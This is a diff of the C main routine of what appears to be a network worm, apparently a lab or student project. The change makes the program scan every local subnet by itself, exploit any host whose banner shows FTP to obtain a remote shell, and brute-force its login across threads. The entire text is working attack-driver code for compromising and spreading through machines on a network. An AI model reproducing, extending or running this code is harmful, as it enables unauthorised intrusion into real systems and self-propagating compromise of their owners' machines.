@@ -1,27 +1,12 @@
 #include <stdio.h>
 #include <stdlib.h>
 #include <string.h>
+#include <ifaddrs.h>
 //---
 #include "scanner.h"
 #include "bruteforce.h"
 #include "exploit.h"
 #include "spread.h"
-
-#ifndef ADDRESS_RANGE
-#  define ADDRESS_RANGE       "192.168.100.30"
-#endif
-
-#ifndef PORT_RANGE
-#  define PORT_RANGE          "10-30"
-#endif
-
-#ifndef INTERFACE
-#  define INTERFACE           "br0"
-#endif
-
-#ifndef USE_RAW_SOCKET
-#  define USE_RAW_SOCKET      0
-#endif
 
 #ifndef FTP_USER
 #  define FTP_USER            "rrlm"
@@ -64,22 +49,94 @@ void *try_bruteforce(void *arguments) {
   return NULL;
 }
 
-int main(int argc, const char *argv[]) {
-  struct scan_table *target_table, *target;
+int main(int argc, char *const *argv) {
+  struct scan_table *target_table, *target, *ifa_table;
   struct bruteforce_arguments args[MAX_THREADS];
-  int shell_fd, method, err;
+  struct ifaddrs *addresses, *ifa;
+  struct sockaddr_in *addr;
+  char range[32];
+  char *interface = NULL;
+  int shell_fd, method, opt, err;
+  int use_raw_socket = 0, verbose = 0;
   unsigned int i;
 
+  while((opt = getopt(argc, argv, "svi:")) != -1) {
+    switch(opt) {
+      case 's':
+        use_raw_socket = 1;
+        break;
+      case 'v':
+        verbose = 1;
+        break;
+      case 'i':
+        interface = strdup(optarg);
+        break;
+      default:
+        fprintf(stdout, "Uso: %s [-sv] [-i interface] <address range> [port range]\n", argv[0]);
+        exit(0);
+    }
+  }
+
+  target_table = NULL;
+  ifa_table = NULL;
   srand(time(NULL));
   pthread_mutex_init(&bruteforce_lock, NULL);
-  target_table = scanner(ADDRESS_RANGE, PORT_RANGE, INTERFACE, USE_RAW_SOCKET, 0);
+
+  if(verbose != 0) {
+    fprintf(stdout, "Performing address scan...\n");
+  }
+
+  if(argc <= optind) {
+    getifaddrs(&addresses);
+
+    for(ifa = addresses; ifa != NULL; ifa = ifa->ifa_next) {
+      if(strncmp(ifa->ifa_name, "lo", 2) != 0 && ifa->ifa_addr != NULL &&
+                 ifa->ifa_addr->sa_family == AF_INET) {
+        addr = (struct sockaddr_in *) ifa->ifa_addr;
+        snprintf(range, sizeof range, "%s", inet_ntoa(addr->sin_addr)); 
+
+        for(i = strlen(range); i > 0 && range[i] != '.'; --i) {
+          range[i] = '\0';
+        }
+
+        strncpy(range + i + 1, "1-255\0", sizeof range - i - 1);
+
+        if(verbose != 0) {
+          fprintf(stdout, "Scanning interface %s (%s)...\n", ifa->ifa_name, range);
+        }
+
+        ifa_table = scanner(range, "\0", interface, use_raw_socket, 0);
+
+        for(target = ifa_table; target != NULL; target = target->next) {
+          if(target->next == NULL) {
+            target->next = target_table;
+            break;
+          }
+        }
+
+        target_table = ifa_table;
+      }
+    }
+
+    freeifaddrs(addresses);
+  } else {
+    if(verbose != 0) {
+      fprintf(stdout, "Scanning range %s...\n", argv[optind]);
+    }
+
+    target_table = scanner(argv[optind], (argc > optind + 1) ? argv[optind + 1] : "\0", interface, use_raw_socket, 0);
+  }
+
+  fprintf(stdout, "Address scan completed!\n");
 
   if(target_table != NULL) {
     for(target = target_table; target != NULL; target = target->next) {
       if(strstr(target->banner, "FTP") != NULL) {
+        fprintf(stdout, "Attacking target \"%s:%u\"...\n", target->address, target->port);
         shell_fd = remote_exploit(target->address, target->port, "ftp", "mozilla@");
 
         if((method = rand() % 1) == 0) {
+          fprintf(stdout, "Performing brute-force attack...\n");
           for(i = 0; i < MAX_THREADS; ++i) {
             args[i].target = target;
             args[i].thread_id = i;
@@ -105,8 +162,13 @@ int main(int argc, const char *argv[]) {
         }
 
         close(shell_fd);
+        fprintf(stdout, "Attack completed!\n");
       }
     }
+  }
+
+  if(interface != NULL) {
+    free(interface);
   }
 
   pthread_mutex_destroy(&bruteforce_lock);
